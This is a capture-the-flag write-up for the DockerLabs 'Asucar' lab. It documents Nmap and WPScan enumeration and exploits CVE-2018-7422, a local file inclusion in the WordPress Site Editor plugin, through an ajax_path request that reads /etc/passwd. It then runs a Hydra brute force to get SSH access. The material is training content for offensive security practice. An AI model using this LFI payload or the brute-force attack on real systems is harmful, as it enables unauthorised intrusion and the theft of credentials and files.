![](adjuntos/Pasted%20image%2020260218031919.png)

# Asucar – DockerLabs

> Exploitation of CVE-2018-7422 in the WordPress _Site Editor 1.1.1_ plugin, resulting in Local File Inclusion (LFI), sensitive file disclosure, user enumeration, and authenticated SSH access, ultimately leading to system-level compromise within a Docker-based environment.

---
## 1️⃣ Lab Information

- **Platform:** [DockerLabs](https://dockerlabs.es)
- **Environment Type:** Docker container
- **Target Service:** WordPress 6.5.3 (Apache 2.4.59 – Debian)
- **Exploited Vulnerability:** CVE-2018-7422 – Local File Inclusion in **Site Editor 1.1.1** plugin, followed by SSH access via weak credentials
- **Difficulty:** Medium

### Demonstrated Skills

- Full service enumeration (Nmap)
- Virtual Host identification (`asucar.dl`)
- Advanced WordPress enumeration (WPScan)
- Public vulnerability research (Exploit-DB)
- Local File Inclusion (LFI) exploitation
- `/etc/passwd` analysis for system user enumeration
- Targeted brute-force attack using Hydra
- Interactive SSH access
- Basic Linux post-exploitation

## 🐳 2️⃣ Deployment

The machine is deployed as a container using the provided script:
```bash
sudo bash auto_deploy.sh asucar.tar
[+] Image loaded successfully 
[+] Container started 
[+] Assigned IP: 172.17.0.2
```

## 🔎 3️⃣ Enumeration
```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 escaneo
```
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
```

## 4️⃣ Analysis

The scan identified two exposed services:

- **22/tcp → SSH (OpenSSH 9.2p1)**
- **80/tcp → HTTP (Apache 2.4.59 – Debian)**

Initial access via IP address (`172.17.0.2`) resulted in incomplete page rendering, suggesting a Virtual Host-based configuration.

Source code inspection (`Ctrl + U`) revealed references to the internal domain `asucar.dl`, which was resolved by modifying the `/etc/hosts` file.

The presence of **WordPress 6.5.3** was confirmed as the primary application.

📌 At this stage, the HTTP service was considered the primary attack surface due to direct exposure of a dynamic CMS.

## 5️⃣ Identification and Attack Preparation

### 5.1 WordPress Enumeration

Automated CMS enumeration:
```bash
wpscan --url http://asucar.dl/ -e u,p
```

Relevant output:
```bash
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://asucar.dl/ [172.17.0.2]
[+] Started: Wed Feb 18 03:45:26 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.59 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://asucar.dl/xmlrpc.php
 | Found By: Link Tag (Passive Detection)
 | Confidence: 100%
 | Confirmed By: Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://asucar.dl/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://asucar.dl/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://asucar.dl/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5.3 identified (Insecure, released on 2024-05-07).
 | Found By: Rss Generator (Passive Detection)
 |  - http://asucar.dl/index.php/feed/, <generator>https://wordpress.org/?v=6.5.3</generator>
 |  - http://asucar.dl/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.5.3</generator>

[+] WordPress theme in use: twentytwentyfour
 | Location: http://asucar.dl/wp-content/themes/twentytwentyfour/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://asucar.dl/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.4
 | [!] Directory listing is enabled
 | Style URL: http://asucar.dl/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://asucar.dl/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'

[+] Enumerating Most Popular Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] site-editor
 | Location: http://asucar.dl/wp-content/plugins/site-editor/
 | Last Updated: 2017-05-02T23:34:00.000Z
 | [!] The version is out of date, the latest version is 1.1.1
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://asucar.dl/wp-content/plugins/site-editor/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://asucar.dl/wp-content/plugins/site-editor/readme.txt

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <========================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] wordpress
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://asucar.dl/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Feb 18 03:45:29 2026
[+] Requests Done: 54
[+] Cached Requests: 7
[+] Data Sent: 14.12 KB
[+] Data Received: 413.624 KB
[+] Memory used: 275.676 MB
[+] Elapsed time: 00:00:03
```
### 5.2 Vulnerability Analysis

The plugin identified during enumeration:

- `site-editor`
- Version: 1.1.1
- Last updated: 2017

Public research revealed the associated vulnerability:

- **CVE-2018-7422**
- Type: **Local File Inclusion (LFI)**
- EDB-ID: 44340

The flaw affects:
```bash
wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php
```

The `ajax_path` parameter allows arbitrary local file inclusion without proper validation.

📌 This behavior enables disclosure of system files and sensitive information, facilitating further compromise of the environment.


## 6️⃣ Exploitation

The PoC associated with **CVE-2018-7422** was used to validate the LFI vulnerability.

Request:
```bash
http://asucar.dl/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```

The contents of `/etc/passwd` were successfully retrieved, confirming arbitrary local file inclusion.

Relevant excerpt:
![](adjuntos/Pasted%20image%2020260218034859.png)

📌 Vulnerability confirmed.

Reading `/etc/passwd` allowed identification of a valid system user (`curiosito`), enabling a pivot toward the exposed SSH service.

## 7️⃣ Pivot to SSH

After retrieving `/etc/passwd`, the following system user was identified:
```bash
24 curiosito:x:1000:1000:curiosito:/home/curiosito:/bin/bash
```

Given that:
- **22/tcp (SSH)** was exposed
- The user has a **valid shell (`/bin/bash`)**

A targeted authentication attack against the SSH service was conducted.

### Controlled brute-force attack
```bash
hydra -l curiosito -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

Valid credentials obtained:
```bash
[22][ssh] host: 172.17.0.2   login: curiosito   password: password1
```

## 8️⃣ SSH Access

Using the obtained credentials, a direct connection to the exposed SSH service was established.
```bash
ssh curiosito@asucar.dl
```

Authentication:
```bash
password1
```

Access granted:
```bash
curiosito@asucar:~$
```
Basic verification:
```bash
whoami | id
```

Output:
```bas
uid=1000(curiosito) gid=1000(curiosito) groups=1000(curiosito)
```

📌 Interactive access to the system was obtained as the standard user `curiosito`.

The compromise extended beyond the web application context into system-level access, enabling post-exploitation activities and potential privilege escalation.